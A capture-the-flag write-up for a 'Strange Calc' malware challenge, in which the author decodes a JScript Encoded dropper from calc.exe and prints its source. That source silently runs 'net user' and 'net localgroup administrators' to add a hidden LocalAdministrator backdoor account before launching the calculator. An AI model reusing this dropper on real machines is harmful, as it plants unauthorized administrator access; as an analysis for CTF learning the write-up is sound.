+++
title = "Strange Calc"
description = "I got this new calculator app from my friend! But it's really weird, for some reason it needs admin permissions to run??"
authors = ["cstef"]
date = 2024-09-30

[taxonomies]
categories = ["malware"]
+++

## Description

I got this new calculator app from my friend! But it's really weird, for some reason it needs admin permissions to run??

----

We start off with `calc.exe`, which seemingly needs adminstrator permissions to run. After launching it with `wine` a few times, we notice a `.jse` file being created at each run.

The analysis of this file reveals that it's a `JScript Encoded` one. Decrypting with [CyberChef](https://gchq.github.io/CyberChef/#recipe=Microsoft_Script_Decoder()), we get the following:

```js
function a(b) {
  var c = "",
    d = b.split("\n");
  for (var e = 0; e < d.length; e++) {
    var f = d[e].replace(/^\s+|\s+$/g, "");
    if (f.indexOf("begin") === 0 || f.indexOf("end") === 0 || f === "")
      continue;
    var g = (f.charCodeAt(0) - 32) & 63;
    for (var h = 1; h < f.length; h += 4) {
      if (h + 3 >= f.length) break;
      var i = (f.charCodeAt(h) - 32) & 63,
        j = (f.charCodeAt(h + 1) - 32) & 63,
        k = (f.charCodeAt(h + 2) - 32) & 63,
        l = (f.charCodeAt(h + 3) - 32) & 63;
      c += String.fromCharCode((i << 2) | (j >> 4));
      if (h + 2 < f.length - 1)
        c += String.fromCharCode(((j & 15) << 4) | (k >> 2));
      if (h + 3 < f.length - 1) c += String.fromCharCode(((k & 3) << 6) | l);
    }
  }
  return c.substring(0, g);
}
var m =
  "begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend";
var n = a(m);
var o = [
  "net user LocalAdministrator " + n + " /add",
  "net localgroup administrators LocalAdministrator /add",
  "calc.exe",
];
var p = new ActiveXObject("WScript.Shell");
for (var q = 0; q < o.length - 1; q++) {
  p.Run(o[q], 0, false);
}
p.Run(o[2], 1, false);
```

I first tried logging the `a(m)` function, but it just didn't want to print anything. I then decided to refactor a bit the script to see what was going on in the decryption function.

```js
function decodeEncodedString(encoded) {
	let decodedString = "";
	const lines = encoded.split("\n");

	for (let line of lines) {
		line = line.trim();
		if (line.startsWith("begin") || line.startsWith("end") || line === "") continue;

		const numCharsToReturn = (line.charCodeAt(0) - 32) & 63;

		for (let i = 1; i < line.length; i += 4) {
			if (i + 3 >= line.length) break;

			const char1 = (line.charCodeAt(i) - 32) & 63;
			const char2 = (line.charCodeAt(i + 1) - 32) & 63;
			const char3 = (line.charCodeAt(i + 2) - 32) & 63;
			const char4 = (line.charCodeAt(i + 3) - 32) & 63;

			decodedString += String.fromCharCode((char1 << 2) | (char2 >> 4));
			if (i + 2 < line.length - 1) {
				decodedString += String.fromCharCode(((char2 & 15) << 4) | (char3 >> 2));
			}
			if (i + 3 < line.length - 1) {
				decodedString += String.fromCharCode(((char3 & 3) << 6) | char4);
			}
		}
		return decodedString.substring(0, numCharsToReturn);
	}
}

const encodedMessage = "begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend";
const decodedMessage = decodeEncodedString(encodedMessage);
console.log(decodedMessage);
```

For some reason, this version ran fine, even though I did not alter the logic of the function, but we'll take that.

```
flag{9922fb21aaf1757e3fdb28d7890a5d93}
```


## Note 

This could also simply have been solved by looking at the Administrator users on the Windows machine, but I did not have a VM at this moment, so I had to go the "hard" way...